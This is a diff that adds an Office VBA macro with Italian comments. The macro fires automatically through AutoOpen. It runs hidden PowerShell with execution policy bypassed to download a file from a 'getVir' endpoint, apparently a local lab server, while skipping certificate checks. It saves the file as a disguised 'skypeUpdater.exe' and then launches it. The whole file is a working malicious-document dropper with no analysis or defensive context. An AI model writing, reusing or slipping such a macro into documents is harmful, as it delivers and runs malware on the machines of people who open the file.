@@ -1,0 +1,28 @@
+Sub AutoOpen()
+    EseguiComandoPowerShell
+End Sub
+
+Sub EseguiComandoPowerShell()
+    Dim wsh As Object
+    Dim cmdDownload As String
+    Dim cmdExecute As String
+    
+    ' Definisci il comando PowerShell per scaricare la risorsa e salvarla sul computer
+    cmdDownload = "pwsh.exe -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri 'https://127.0.0.1:8443/getVir' -OutFile 'C:\Users\picco\OneDrive\Desktop\skypeUpdater.exe' -SkipCertificateCheck"""
+    
+    ' Definisci il comando PowerShell per eseguire il file scaricato
+    cmdExecute = "pwsh.exe -ExecutionPolicy Bypass -Command ""Start-Process 'C:\Users\picco\OneDrive\Desktop\skypeUpdater.exe'"""
+    
+    ' Crea un oggetto WshShell per eseguire il comando di download
+    Set wsh = CreateObject("WScript.Shell")
+    
+    ' Esegui il comando di download
+    wsh.Run cmdDownload, 0, True
+    
+    ' Esegui il comando per eseguire il file scaricato
+    wsh.Run cmdExecute, 0, True
+    
+    ' Rilascia l'oggetto WshShell
+    Set wsh = Nothing
+End Sub
+
